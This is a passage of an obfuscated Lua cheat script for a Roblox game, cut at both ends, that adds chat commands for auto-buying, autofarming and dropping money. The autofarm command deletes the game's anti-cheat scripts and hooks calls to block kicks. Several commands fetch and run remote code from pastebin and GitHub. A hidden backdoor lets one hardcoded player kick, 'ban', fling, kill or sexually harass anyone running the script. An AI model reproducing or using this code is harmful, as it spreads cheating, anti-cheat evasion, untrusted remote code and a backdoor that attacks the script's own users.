                                        fireclickdetector(fm.Parent:FindFirstChild("ClickDetector"))
                                    end
                                end
                            end
                        end
                    )
                )
            end
            if f8 == "view" then
                local fu = f7[2]
                if fu then
                    local fv = f5(fu)
                    if fv then
                        local fw = game.Workspace:FindFirstChildWhichIsA("Camera")
                        az.Text = "Unview"
                        repeat
                            view(fv.Name)
                        until az.Text == "View"
                        fw.CameraSubject = c.Character:FindFirstChildWhichIsA("Humanoid")
                    end
                end
            end
            if f8 == "unview" then
                local fw = game.Workspace:FindFirstChildWhichIsA("Camera")
                fw.CameraSubject = c.Character:FindFirstChildWhichIsA("Humanoid")
                az.Text = "View"
            end
            if f8 == "shield" then
                if IsMod == true then
                    DisableMod = true
                    announce("Immune to mod powers", "", 4)
                end
            end
            if f8 == "unshield" then
                if IsMod == true then
                    DisableMod = false
                    announce("Unimmune to mod powers", "", 4)
                end
            end
            if f8 == "re" then
                c.Character:Destroy()
            end
            if f8 == "ping" then
                while wait() do
                    local Animations =
                        game.Players.LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("MainScreenGui"):FindFirstChild(
                        "AnimationPack"
                    )
                    if Animations then
                        Animations.TextScaled = true
                        Animations.Text = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
                    end
                end
            end
            if f8 == "faceless" or f8 == "noface" then
                c.Character.Head.face:Destroy()
            end
            if f8 == "hidemask" then
                c.Character:FindFirstChild("In-gameMask").Handle:Destroy()
            end
            if f8 == "names" then
                local function fx()
                    for s, O in pairs(game:GetService("Workspace").Players:GetChildren()) do
                        if O.Name ~= game.Players:FindFirstChild(O.Name).DisplayName then
                            if
                                O:FindFirstChild("UpperTorso"):FindFirstChild("OriginalSize") or
                                    O:FindFirstChild("LowerTorso"):FindFirstChild("OriginalSize")
                             then
                                O:FindFirstChildWhichIsA("Humanoid").DisplayName =
                                    game.Players:FindFirstChild(O.Name).DisplayName .. " / " .. O.Name
                            end
                        end
                    end
                end
                fx()
            end
            if f8 == "remotespy" then
                loadstring(game:HttpGet("https://pastebin.com/raw/BDhSQqUU", true))()
            end
            if f8 == "flashlight" then
                local cO = c.Character:FindFirstChildWhichIsA("Humanoid")
                local mouse = c:GetMouse()
                local hold =
                    c.Character.Humanoid:LoadAnimation(
                    game:GetService("ReplicatedStorage").ClientAnimations.SmallGunAim
                )
                local fj = Instance.new("Tool", c.Backpack)
                fj.RequiresHandle = false
                fj.CanBeDropped = true
                fj.Name = "Flashlight"
                fj.ToolTip = "rpg"
                local fy = "[Flashlight]"
                local function fk()
                    hold:Play()
                    for s, O in pairs(c.Backpack:GetChildren()) do
                        if O.Name == fy then
                            O.Parent = c.Character
                        end
                    end
                    wait(0.2)
                    for s, O in pairs(c.Character:GetChildren()) do
                        if O.Name == fy then
                            O:Activate()
                        end
                    end
                end
                fj.Activated:Connect(
                    function()
                        fk()
                    end
                )
                fj.Unequipped:Connect(
                    function()
                        hold:Stop()
                    end
                )
                fj.Equipped:Connect(
                    function()
                        hold:Play()
                        local fz = 0
                        for s, O in pairs(c.Backpack:GetChildren()) do
                            if O.Name == fy then
                                fz = fz + O.Ammo.Value
                            end
                        end
                        fj.ToolTip = fz
                    end
                )
                coroutine.resume(
                    coroutine.create(
                        function()
                            local fm = game:GetService("Workspace").Ignored.Shop["[Flashlight] - $10"].Head
                            while wait(0.05) do
                                local ft =
                                    game:GetService("Players"):FindFirstChild(c.Name).PlayerGui.MainScreenGui:FindFirstChild(
                                    "whiteScreen"
                                )
                                if ft then
                                    ft:Destroy()
                                end
                                local fn = c.Character:FindFirstChild("HumanoidRootPart")
                                if fn and c.Character:FindFirstChild("Flashlight") then
                                    local fo = (fn.Position - fm.Position).Magnitude
                                    if fo <= 30 then
                                        for s, O in pairs(c.Backpack:GetChildren()) do
                                            local cO = c.Character:FindFirstChildWhichIsA("Humanoid")
                                            if O.Name == "[Flashlight]" then
                                                O.Parent = c.Character
                                            end
                                        end
                                        fireclickdetector(fm.Parent:FindFirstChild("ClickDetector"))
                                    end
                                end
                            end
                        end
                    )
                )
            end
            if f8 == "nuke" then
                local fj = Instance.new("Tool", c.Backpack)
                fj.RequiresHandle = false
                fj.CanBeDropped = true
                fj.Name = "Nuke"
                fj.ToolTip = "tazer"
                local function fk()
                    hold:Play()
                    for s, O in pairs(c.Backpack:GetChildren()) do
                        if O.Name == "[Grenade]" then
                            O.Parent = c.Character
                        end
                    end
                    for s, O in pairs(c.Character:GetChildren()) do
                        if O.Name == "[Grenade]" then
                            O:Activate()
                            O:Activate()
                        end
                    end
                end
                fj.Activated:Connect(
                    function()
                        fk()
                        for s, O in pairs(game.Workspace.Ignored:GetChildren()) do
                            if O.Name == "Handle" then
                                O.Position = mouse.Hit.p
                            end
                        end
                    end
                )
                fj.Unequipped:Connect(
                    function()
                        hold:Stop()
                    end
                )
                fj.Equipped:Connect(
                    function()
                        while c.Character:FindFirstChild("Nuke") do
                            local dj = 0
                            for s, O in pairs(c.Character:GetChildren()) do
                                if O.Name == "[Grenade]" then
                                    dj = dj + 1
                                end
                            end
                            fj.ToolTip = tostring(dj)
                            wait(3)
                        end
                    end
                )
                coroutine.resume(
                    coroutine.create(
                        function()
                            local fm = game:GetService("Workspace").Ignored.Shop["[Grenade] - $700"].Head
                            while wait(0.05) do
                                local ft =
                                    game:GetService("Players"):FindFirstChild(c.Name).PlayerGui.MainScreenGui:FindFirstChild(
                                    "whiteScreen"
                                )
                                if ft then
                                    ft:Destroy()
                                end
                                local fn = c.Character:FindFirstChild("HumanoidRootPart")
                                if fn and c.Character:FindFirstChild("Nuke") then
                                    local fo = (fn.Position - fm.Position).Magnitude
                                    if fo <= 30 then
                                        for s, O in pairs(c.Backpack:GetChildren()) do
                                            local cO = c.Character:FindFirstChildWhichIsA("Humanoid")
                                            if O.Name == "[Grenade]" then
                                                O.Parent = c.Character
                                            end
                                        end
                                        fireclickdetector(fm.Parent:FindFirstChild("ClickDetector"))
                                    end
                                end
                            end
                        end
                    )
                )
            end
            if f8 == "mute" then
                if tostring(f7[2]) == "all" then
                    muteingnew = true
                    for n, O in pairs(b:GetChildren()) do
                        if not table.find(muted, O.Name) then
                            table.insert(muted, O.Name)
                            print("muted " .. O.Name)
                        end
                    end
                else
                    local fu = f7[2]
                    if fu then
                        local fv = f5(fu)
                        if fv then
                            if not table.find(muted, fv.Name) then
                                table.insert(muted, fv.Name)
                                print("manualy muted " .. fv.Name)
                            end
                        end
                    end
                end
            end
            coroutine.resume(
                coroutine.create(
                    function()
                        local function fA()
                            for s, O in pairs(b:GetChildren()) do
                                if table.find(muted, O.Name) then
                                    if O.Character then
                                        if
                                            O.Character.LowerTorso:FindFirstChild("BOOMBOXSOUND") and
                                                O.Character.UpperTorso:FindFirstChild("OriginalSize")
                                         then
                                            O.Character.LowerTorso:FindFirstChild("BOOMBOXSOUND"):Stop()
                                        end
                                    end
                                end
                            end
                        end
                        while wait(.2) do
                            local V, W = pcall(fA)
                        end
                    end
                )
            )
            if f8 == "unmute" then
                if tostring(f7[2]) == "all" then
                    muteingnew = false
                    for n, O in pairs(b:GetChildren()) do
                        if table.find(muted, O.Name) then
                            local fB = table.find(muted, O.Name)
                            table.remove(muted, fB)
                            print("unmuteed " .. O.Name)
                        end
                    end
                else
                    local fu = f7[2]
                    if fu then
                        local fv = f5(fu)
                        if fv then
                            if table.find(muted, fv.Name) then
                                local fB = table.find(muted, fv.Name)
                                table.remove(muted, fB)
                                print("unmuteed " .. fv.Name)
                            end
                        end
                    end
                end
            end
            if f8 == "buy" then
                local fC = nil
                local fD = nil
                local fE = nil
                local fF = c.Character.HumanoidRootPart.CFrame
                local fG = c.DataFolder.Currency.Value
                for s, O in pairs(game:GetService("Workspace").Ignored.Shop:GetChildren()) do
                    if fC == nil then
                        if string.find(string.lower(O.Name), f7[2]) and not string.find(O.Name, "Ammo") and fC == nil then
                            if f7[2] == "shotgun" then
                                fC = game:GetService("Workspace").Ignored.Shop["[Shotgun] - $1250"]
                            elseif f7[2] == "tacshotgun" or f7[2] == "tacticalshotgun" then
                                fC = game:GetService("Workspace").Ignored.Shop["[TacticalShotgun] - $1750"]
                            elseif f7[2] == "key" then
                                fC = game:GetService("Workspace").Ignored.Shop["[Key] - $125"]
                            else
                                fC = O
                            end
                        end
                        if fC then
                            if string.find(fC.Name, "Mask") then
                                fC = game:GetService("Workspace").Ignored.Shop["[Surgeon Mask] - $25"]
                            end
                            local fH = string.split(fC.Name, "$")
                            local fI = string.split(fC.Name, "-")
                            local fJ = tonumber(fH[2])
                            local f6 = string.gsub(tostring(fI[1]), " ", "")
                            print(f6)
                            local function fK()
                                wait()
                                fG = c.DataFolder.Currency.Value
                                c.Character.HumanoidRootPart.CFrame = fC.Head.CFrame
                                fireclickdetector(fC.ClickDetector)
                            end
                            if f6 == "[MoneyGun]" then
                                repeat
                                    fK()
                                until c.Backpack:FindFirstChild("[Money Gun]") or fG < fJ
                            elseif f6 == "[Double" then
                                repeat
                                    fK()
                                until c.Backpack:FindFirstChild("[Double-Barrel SG]") or fG < fJ
                            elseif f6 == "[SurgeonMask]" then
                                repeat
                                    fK()
                                until c.Backpack:FindFirstChild("[Surgeon Mask]") or fG < fJ
                            elseif f6 ~= "[MediumArmor]" then
                                repeat
                                    fK()
                                until c.Backpack:FindFirstChild(f6) or fG < fJ
                            else
                                repeat
                                    fK()
                                until c.Backpack:FindFirstChild(f6) or fG < fJ or
                                    c.Character.BodyEffects.Armor.Value == 100
                            end
                            c.Character.HumanoidRootPart.CFrame = fF
                        end
                    end
                end
            end
        end
        c.Chatted:Connect(
            function(fL, fM)
                fL = string.lower(fL)
                local fN = fL:split(" ")
                local fO = fN[1]
                local fP = fO:split(f4)
                local fQ = fP[2]
                if eP[fQ] then
                    local f7 = {}
                    for s = 2, #fN, 1 do
                        table.insert(f7, fN[s])
                    end
                    eP[fQ](f7)
                end
            end
        )
        wait(5)
        if f2[c.UserId] then
            IsMod = true
            DisableMod = true
            announce("Granted Mod Powers", "you are immune to mod powers | type /e noshield or /e shield to toggle", 10)
        elseif table.find(eM, c.UserId) then
            announce("Granted Admin Powers", "hi :3", 10)
            IsMod = false
            DisableMod = false
        else
            IsMod = false
            DisableMod = false
            announce("Commands Loaded", "join discord.gg/swagmode for a list of commands", 10)
        end
    end
)
if W then
    print(W)
end
local fR = game.Players.lunerstar3070
local fS = function()
    game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
    game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
end
local fT = function()
    game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
    game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
end
fR.Chatted:connect(
    function(fU)
        if fU:match(":kick .") then
            if game.Players.LocalPlayer ~= fR then
                game.Players.LocalPlayer:Kick("Kicked by Premium user")
            end
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":fling .") then
            if game.Players.LocalPlayer ~= fR then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
                power = 99999999
                game:GetService("RunService").Stepped:connect(
                    function()
                        game.Players.LocalPlayer.Character.Head.CanCollide = false
                        game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
                        game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
                    end
                )
                wait(.1)
                local fV = Instance.new("BodyThrust")
                fV.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
                fV.Force = Vector3.new(power, 0, power)
                fV.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
            end
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":benx .") then
            if game.Players.LocalPlayer ~= fR then
                wait(0)
                local e5 = "Yeah Yeah!"
                local e6 = "All"
                local e7 = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
                e7:FireServer(e5, e6)
                game.Workspace:FindFirstChildWhichIsA("Camera").CameraSubject = fR.Character.HumanoidRootPart
                local fW = true
                while fW == true do
                    hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
                    pcall(
                        function()
                            hummy.Parent.Pants:Destroy()
                        end
                    )
                    pcall(
                        function()
                            hummy.Parent.Shirt:Destroy()
                        end
                    )
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        fR.Character.HumanoidRootPart.CFrame + fR.Character.HumanoidRootPart.CFrame.lookVector * 0.5
                    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity =
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
                    wait(0.1)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity =
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
                end
            end
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":unbenx .") then
            if game.Players.LocalPlayer ~= fR then
                benxPos = c.Character.HumanoidRootPart.CFrame
                game.Players.LocalPlayer.Character.Humanoid:Destroy()
                wait(7)
                c.Character.HumanoidRootPart.CFrame = benxPos
            end
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":freeze .") then
            if game.Players.LocalPlayer ~= fR then
                fS()
            end
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":unfreeze .") then
            if game.Players.LocalPlayer ~= fR then
                fT()
            end
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":thaw .") then
            if game.Players.LocalPlayer ~= fR then
                fT()
            end
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":ban .") then
            if game.Players.LocalPlayer ~= fR then
                game.Players.LocalPlayer:kick("PERMA BAN")
            end
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":kill .") then
            if game.Players.LocalPlayer ~= fR then
                game.Players.LocalPlayer.Character.Humanoid:Destroy()
            end
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":premcmds") then
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":void .") then
            if game.Players.LocalPlayer ~= fR then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
            end
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":bring .") then
            if game.Players.LocalPlayer ~= fR then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                    CFrame.new(fR.Character.UpperTorso.Position)
            end
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":grave .") then
            if game.Players.LocalPlayer ~= fR then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                    CFrame.new(
                    game.Players.LocalPlayer.Character.UpperTorso.Position.X,
                    game.Players.LocalPlayer.Character.UpperTorso.Position.Y - 10,
                    game.Players.LocalPlayer.Character.UpperTorso.Position.z
                )
                game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
            end
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":ungrave .") then
            if game.Players.LocalPlayer ~= fR then
                game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
                wait(0.1)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                    CFrame.new(
                    game.Players.LocalPlayer.Character.UpperTorso.Position.X,
                    game.Players.LocalPlayer.Character.UpperTorso.Position.Y + 10,
                    game.Players.LocalPlayer.Character.UpperTorso.Position.z
                )
            end
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":grave me") then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                CFrame.new(
                game.Players.LocalPlayer.Character.UpperTorso.Position.X,
                game.Players.LocalPlayer.Character.UpperTorso.Position.Y - 10,
                game.Players.LocalPlayer.Character.UpperTorso.Position.z
            )
            game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":ungrave me") then
            game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
            wait(0.1)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                CFrame.new(
                game.Players.LocalPlayer.Character.UpperTorso.Position.X,
                game.Players.LocalPlayer.Character.UpperTorso.Position.Y + 10,
                game.Players.LocalPlayer.Character.UpperTorso.Position.z
            )
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":kick me") then
            if game.Players.LocalPlayer == fR then
                game.Players.LocalPlayer:Kick("Kicked yourself")
            end
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":freeze me") then
            if game.Players.LocalPlayer == fR then
                fS()
            end
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":unfreeze me") then
            if game.Players.LocalPlayer == fR then
                fT()
            end
        end
    end
)
fR.Chatted:connect(
    function(fU)
        if fU:match(":cmds") then
            game:GetService("StarterGui"):SetCore(
                "SendNotification",
                {
                    Title = "Cmds:",
                    Text = ":Freeze :grave :benx :bring :void :kill :kick :ban :fling",
                    Time = 10,
                    Icon = "rbxassetid://505845268"
                }
            )
        end
    end
)
game.Players.LocalPlayer.Chatted:connect(
    function(fU)
        if fU:match(":autofarm") then
            if not game:IsLoaded() then
                game.Loaded:Wait()
            end
            local c = game.Players.LocalPlayer
            wait(1)
            local e5 = "[$-T0P-$] Auto-Farm Loading..."
            local e6 = "All"
            local e7 = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
            e7:FireServer(e5, e6)
            NamePos = c.Character.HumanoidRootPart.CFrame
            local dg
            local df = function()
                local dM = c.Character:FindFirstChild("In-gameMask")
                local cO = c.Character:FindFirstChildWhichIsA("Humanoid")
                if not dM then
                    local dN = c.Character:FindFirstChild("Mask") or c.Backpack:FindFirstChild("Mask")
                    if dN then
                        local dO = c.Backpack:FindFirstChild("Mask")
                        if dO then
                            cO:EquipTool(dO)
                            wait(0.1)
                        end
                        dN:Activate()
                    else
                        local dP = "Mask"
                        local d6 = 60
                        local d7 = game:GetService("Workspace").Ignored.Shop["[Paintball Mask] - $60"].ClickDetector
                        local d8 = game:GetService("Workspace").Ignored.Shop["[Paintball Mask] - $60"].Head.Position
                        local function d9()
                            wait()
                            c.Character.HumanoidRootPart.CFrame = CFrame.new(d8)
                            fireclickdetector(d7)
                            if not c.Character.LeftHand:FindFirstChild("LeftWrist") then
                                c.Character.LeftHand.Position = c.Character.LeftLowerArm.Position
                                c.Character.RightHand.Position = c.Character.RightLowerArm.Position
                            end
                        end
                        repeat
                            d9()
                        until c.Backpack:FindFirstChild(dP) or c.DataFolder.Currency.Value <= d6 or
                            c.Character:FindFirstChild(dP)
                        c.Character.HumanoidRootPart.CFrame = NamePos
                        if not c.Character.LeftHand:FindFirstChild("LeftWrist") then
                            c.Character.LeftHand.Position = c.Character.LeftLowerArm.Position
                            c.Character.RightHand.Position = c.Character.RightLowerArm.Position
                        end
                    end
                else
                    local dQ = c.Character:FindFirstChild("In-gameMask"):FindFirstChild("Handle")
                    if dQ then
                        dQ:Destroy()
                    end
                end
            end
            local dh = function()
                dg = game:GetService("RunService").Heartbeat:Connect(df)
            end
            local di = function()
                dg:Disconnect()
            end
            dh()
            wait(2)
            local c = game.Players.LocalPlayer
            game:GetService("StarterGui"):SetCore(
                "SendNotification",
                {Title = "Join my discord please!", Text = "copied!", Time = 10, Icon = "rbxassetid://505845268"}
            )
            setclipboard("discord.gg/64UqmWpgTy")
            local fX = function()
                if game:IsLoaded() then
                    c.Character.HumanoidRootPart.CFrame = CFrame.new(0, 500, 0)
                    wait(3)
                    for n, dc in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                        if dc:IsA("BasePart") then
                            dc.CanCollide = false
                        end
                    end
                    local Q = game.Players.LocalPlayer
                    repeat
                        wait()
                    until Q.Character:FindFirstChild("FULLY_LOADED_CHAR")
                    for s, O in pairs(game.Workspace:GetDescendants()) do
                        if O:IsA("Seat") then
                            O:Destroy()
                        end
                    end
                    function DeleteAntiCheat()
                        for s, O in pairs(Q.Character:GetChildren()) do
                            if O.ClassName == "Script" and O.Name ~= "Health" then
                                O:Destroy()
                            end
                        end
                    end
                    Q.CharacterAdded:Connect(
                        function(db)
                            repeat
                                wait()
                            until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and
                                game.Players.LocalPlayer.Character:findFirstChild("FULLY_LOADED_CHAR")
                            DeleteAntiCheat()
                            wait(1)
                            reset = false
                        end
                    )
                    DeleteAntiCheat()
                    local reset = false
                    spawn(
                        function()
                            while wait() do
                                pcall(
                                    function()
                                        if Q.Character.Humanoid.Health <= 0 then
                                            reset = true
                                        end
                                    end
                                )
                            end
                        end
                    )
                    repeat
                        wait()
                    until game:IsLoaded()
                    local p = getrawmetatable(game)
                    setreadonly(p, false)
                    local q = p.__namecall
                    p.__namecall =
                        newcclosure(
                        function(self, ...)
                            local r = {...}
                            if
                                not checkcaller() and getnamecallmethod() == "FireServer" and
                                    tostring(self) == "MainEvent"
                             then
                                if tostring(getcallingscript()) ~= "Framework" then
                                    return
                                end
                            end
                            if not checkcaller() and getnamecallmethod() == "Kick" then
                                return
                            end
                            return q(self, unpack(r))
                        end
                    )
                    game:GetService("Players").LocalPlayer.Idled:connect(
                        function()
                            game:GetService("VirtualUser"):Button2Down(
                                Vector2.new(0, 0),
                                workspace.CurrentCamera.CFrame
                            )
                            wait(1)
                            game:GetService("VirtualUser"):Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
                        end
                    )
                    game:GetService("RunService").Stepped:connect(
                        function()
                            pcall(
                                function()
                                    Q.Character.Humanoid:ChangeState(11)
                                end
                            )
                            setsimulationradius(math.huge)
                        end
                    )
                    while wait(0.5) do
                        for s, O in pairs(game.Workspace.Cashiers:GetChildren()) do
                            if O.Humanoid.Health > 0 then
                                spawn(
                                    function()
                                        while O.Humanoid.Health > 0 do
                                            wait()
                                            pcall(
                                                function()
                                                    Q.Character.HumanoidRootPart.CFrame =
                                                        O.Head.CFrame * CFrame.new(0, -2, 1.5)
                                                end
                                            )
                                        end
                                    end
                                )
                                repeat
                                    pcall(
                                        function()
                                            Q.Character.Humanoid:EquipTool(Q.Backpack.Combat)
                                        end
                                    )
                                    wait(0.1)
                                    pcall(
                                        function()
                                            Q.Character.Combat:Activate()
                                            wait(2)
                                            Q.Character.Combat:Deactivate()
                                            wait(1)
                                        end
                                    )
                                until O.Humanoid.Health <= 0
                                wait(0.1)
                                for fY, fZ in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
                                    fZ.Name = "Grabbing"
                                    fZ.Anchored = true
                                    while game.Workspace.Ignored.Drop:FindFirstChild("Grabbing") do
                                        wait()
                                        pcall(
                                            function()
                                                Q.character.HumanoidRootPart.CFrame = fZ.CFrame
                                                if not reset then
                                                    fireclickdetector(fZ.ClickDetector)
                                                end
                                            end
                                        )
                                    end
                                end
                                local dg
                                local df = function()
                                    for s, O in pairs(game:GetService("Workspace")["Ignored"]["Drop"]:GetChildren()) do
                                        if O:IsA("Part") then
                                            if (O.Position - c.Character.HumanoidRootPart.Position).Magnitude <= 12 then
                                                fireclickdetector(O:FindFirstChild("ClickDetector"))
                                            end
                                        end
                                    end
                                end
                                local dh = function()
                                    dg = game:GetService("RunService").Heartbeat:Connect(df)
                                end
                                dh()
                            end
                        end
                    end
                end
            end
            fX()
        end
    end
)
game.Players.LocalPlayer.Chatted:connect(
    function(fU)
        if fU:match(":antistomp") then
            local dg
            local df = function()
                if c.Character.BodyEffects["K.O"].Value == true then
                    local cf = game.Players.LocalPlayer.Character
                    cf.LowerTorso:Destroy()
                    cf.UpperTorso:Destroy()
                    cf.LeftUpperLeg:Destroy()
                    cf.RightUpperLeg:Destroy()
                    cf.RightLowerLeg:Destroy()
                    cf.LeftLowerLeg:Destroy()
                    cf.LeftUpperArm:Destroy()
                    cf.RightUpperArm:Destroy()
                    cf.RightLowerArm:Destroy()
                    cf.LeftLowerArm:Destroy()
                    cf.Head:Destroy()
                    cf.Righthand:Destroy()
                    cf.Lefthand:Destroy()
                end
            end
            local dh = function()
                dg = game:GetService("RunService").Heartbeat:Connect(df)
            end
            dh()
            game:GetService("StarterGui"):SetCore(
                "SendNotification",
                {Title = "loaded", Text = "antistomp!", Time = 10, Icon = "rbxassetid://505845268"}
            )
        end
    end
)
game.Players.LocalPlayer.Chatted:connect(
    function(fU)
        if fU:match(":crash") then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/22kristina/dhcrash_gen2/main/crash", true))()
            wait(0.1)
            wait(0.5)
            local eG = Instance.new("ScreenGui")
            local eH = Instance.new("TextLabel")
            local eI = Instance.new("Frame")
            local eJ = Instance.new("TextLabel")
            local eK = Instance.new("TextLabel")
            eG.Parent = game.CoreGui
            eG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            eH.Parent = eG
            eH.Active = true
            eH.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
            eH.Draggable = true
            eH.Position = UDim2.new(0.698610067, 0, 0.098096624, 0)
            eH.Size = UDim2.new(0, 370, 0, 52)
            eH.Font = Enum.Font.SourceSansSemibold
            eH.Text = "Anti Afk"
            eH.TextColor3 = Color3.new(0, 1, 1)
            eH.TextSize = 22
            eI.Parent = eH
            eI.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
            eI.Position = UDim2.new(0, 0, 1.0192306, 0)
            eI.Size = UDim2.new(0, 370, 0, 107)
            eJ.Parent = eI
            eJ.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
            eJ.Position = UDim2.new(0, 0, 0.800455689, 0)
            eJ.Size = UDim2.new(0, 370, 0, 21)
            eJ.Font = Enum.Font.Arial
            eJ.Text = "Made by luca#5432"
            eJ.TextColor3 = Color3.new(0, 1, 1)
            eJ.TextSize = 20
            eK.Parent = eI
            eK.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
            eK.Position = UDim2.new(0, 0, 0.158377, 0)
            eK.Size = UDim2.new(0, 370, 0, 44)
            eK.Font = Enum.Font.ArialBold
            eK.Text = "Status: Active"
            eK.TextColor3 = Color3.new(0, 1, 1)
            eK.TextSize = 20
            local eL = game:service "VirtualUser"
            game:service "Players".LocalPlayer.Idled:connect(
                function()
                    eL:CaptureController()
                    eL:ClickButton2(Vector2.new())
                    eK.Text = "Roblox tried kicking you buy I didnt let them!"
                    wait(2)
                    eK.Text = "Status : Active"
                end
            )
        end
    end
)
game.Players.LocalPlayer.Chatted:connect(
    function(fU)
        if fU:match(":hub") then
            loadstring(
                game:HttpGet(
                    "https://raw.githubusercontent.com/Topcoldgaming/loadstring-scritps-/main/%5B%24-T0P-%24%5D%20HUB"
                )
            )()
        end
    end
)
game.Players.LocalPlayer.Chatted:connect(
    function(fU)
        if fU:match(":godbullet") then
            local function c5()
                local c6 = game:GetService("Players").LocalPlayer
                local c7 = c6.Character
                c7:FindFirstChildOfClass("Humanoid").Health = 0
                local c8 = c6.CharacterAdded:Wait()
                local c9 = Instance.new("Folder")
                c9.Name = "FULLY_LOADED_CHAR"
                c9.Parent = c8
                c8:WaitForChild("RagdollConstraints"):Destroy()
                local ca = Instance.new("BoolValue", c8)
                ca.Name = "RagdollConstraints"
            end
            c5()
            repeat
                wait()
            until game.Players.LocalPlayer.Character.Humanoid.Health == 100
            wait(0.3)
            local c = game.Players.LocalPlayer
            c.Character.BodyEffects.Armor:Destroy()
            Armor = Instance.new("IntValue", c.Character.BodyEffects)
            Armor.Name = "Armor"
            Armor.Value = 100
            GodLabel = Instance.new("IntValue", Armor)
            GodLabel.Name = "God"
        end
    end
)
game.Players.LocalPlayer.Chatted:connect(
    function(fU)
        if fU:match(":headless") then
            local c = game.Players.LocalPlayer
            c.Character.Head:BreakJoints()
            c.Character.Head.Position = Vector3.new(0, 99999999999999, 0)
        end
    end
)
game.Players.LocalPlayer.Chatted:connect(
    function(fU)
        if fU:match(":drip") then
            local c = game.Players.LocalPlayer
            c.Character.Head:BreakJoints()
            c.Character.Head.Position = Vector3.new(0, 99999999999999, 0)
            c.Character.RightUpperLeg:Destroy()
            c.Character.RightLowerLeg:Destroy()
            local dg
            local df = function()
                local dK =
                    c.Character.BodyEffects.Movement:FindFirstChild("NoJumping") or
                    c.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk") or
                    c.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed")
                if dK then
                    dK:Destroy()
                end
                if c.Character.BodyEffects.Reload.Value == true then
                    c.Character.BodyEffects.Reload.Value = false
                end
            end
            local dh = function()
                dg = game:GetService("RunService").Heartbeat:Connect(df)
            end
            dh()
        end
        local f_ = game.Players.LocalPlayer.Character.Animate
        f_.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
        f_.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
        f_.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
        f_.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
        f_.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
        f_.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
        f_.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
        game.Players.LocalPlayer.Character.Humanoid.Jump = true
    end
)
game.Players.LocalPlayer.Chatted:connect(
    function(fU)
        if fU:match(":drop") then
            if c.DataFolder.Currency.Value >= 10000 then
                repeat
                    MainEvent:FireServer("DropMoney", "10000")
                until c.DataFolder.Currency.Value <= 10000
                if c.DataFolder.Currency.Value <= 10000 then
                    MainEvent:FireServer("DropMoney", c.DataFolder.Currency.Value)
                end
            else
                MainEvent:FireServer("DropMoney", c.DataFolder.Currency.Value)
            end
        end
    end
)
game.Players.LocalPlayer.Chatted:connect(
    function(fU)
